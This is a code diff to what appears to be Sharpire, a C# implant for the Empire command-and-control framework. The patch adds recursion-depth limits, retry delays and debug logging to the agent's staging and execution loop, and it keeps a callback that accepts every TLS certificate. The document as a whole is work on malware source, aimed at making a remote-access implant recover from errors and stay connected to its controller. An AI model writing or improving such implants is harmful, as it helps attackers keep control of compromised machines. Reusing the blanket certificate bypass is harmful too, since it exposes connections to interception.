@@ -109,6 +109,9 @@ namespace Sharpire
         private SessionInfo sessionInfo;
 
         private byte[] stagingKeyBytes;
+        private int executeDepth = 0;
+        private int dotNetEmpireDepth = 0;
+        private const int MAX_RECURSION_DEPTH = 5;
 
         public class RoutingPacket
         {
@@ -155,6 +158,21 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         public void Execute()
         {
+            executeDepth++;
+
+            if (executeDepth > MAX_RECURSION_DEPTH)
+            {
+                Console.WriteLine($"[ERROR] Execute() recursion depth exceeded: {executeDepth}. Exiting to prevent stack overflow.");
+                System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
+                    $"[{DateTime.Now}] Execute() recursion depth exceeded: {executeDepth}\n");
+                Environment.Exit(1);
+                return;
+            }
+
+            Console.WriteLine($"[DEBUG] Execute() depth: {executeDepth}");
+            System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
+                $"[{DateTime.Now}] Execute() called, depth: {executeDepth}\n");
+
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             try
             {
@@ -172,15 +190,25 @@ namespace Sharpire
 
                     DotNetEmpire();
                 }
-                catch
+                catch (Exception innerEx)
                 {
+                    Console.WriteLine($"[ERROR] DotNetEmpire failed: {innerEx.Message}");
+                    System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
+                        $"[{DateTime.Now}] DotNetEmpire exception: {innerEx.Message}\n{innerEx.StackTrace}\n");
+
+                    Thread.Sleep(5000); // Wait before retry
                     Execute();
                 }
             }
             catch (WebException webError)
             {
-                if ((int)((HttpWebResponse)webError.Response).StatusCode == 500)
+                Console.WriteLine($"[ERROR] WebException in Execute: {webError.Message}");
+                System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
+                    $"[{DateTime.Now}] WebException: {webError.Message}\n{webError.StackTrace}\n");
+
+                if (webError.Response != null && (int)((HttpWebResponse)webError.Response).StatusCode == 500)
                 {
+                    Thread.Sleep(5000); // Wait before retry
                     Execute();
                 }
                 else
@@ -190,10 +218,13 @@ namespace Sharpire
             }
             catch (Exception error)
             {
-                Console.WriteLine(error.ToString());
+                Console.WriteLine($"[ERROR] Exception in Execute: {error.ToString()}");
+                System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
+                    $"[{DateTime.Now}] Execute exception: {error.ToString()}\n");
             }
             finally
             {
+                executeDepth--;
                 sessionInfo = null;
                 stagingKeyBytes = null;
             }
@@ -449,15 +480,39 @@ namespace Sharpire
 
         private void DotNetEmpire()
         {
+            dotNetEmpireDepth++;
+
+            if (dotNetEmpireDepth > MAX_RECURSION_DEPTH)
+            {
+                Console.WriteLine($"[ERROR] DotNetEmpire() recursion depth exceeded: {dotNetEmpireDepth}. Exiting to prevent stack overflow.");
+                System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
+                    $"[{DateTime.Now}] DotNetEmpire() recursion depth exceeded: {dotNetEmpireDepth}\n");
+                Environment.Exit(1);
+                return;
+            }
+
+            Console.WriteLine($"[DEBUG] DotNetEmpire() depth: {dotNetEmpireDepth}");
+            System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
+                $"[{DateTime.Now}] DotNetEmpire() called, depth: {dotNetEmpireDepth}\n");
+
             Agent agent = new Agent(sessionInfo);
             agent.GetComs();
             try
             {
                 agent.Execute();
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                Console.WriteLine($"[ERROR] Exception in DotNetEmpire: {ex.Message}");
+                System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
+                    $"[{DateTime.Now}] DotNetEmpire exception: {ex.Message}\n{ex.StackTrace}\n");
+
+                Thread.Sleep(5000); // Wait before retry
                 DotNetEmpire();
+            }
+            finally
+            {
+                dotNetEmpireDepth--;
             }
         }
 
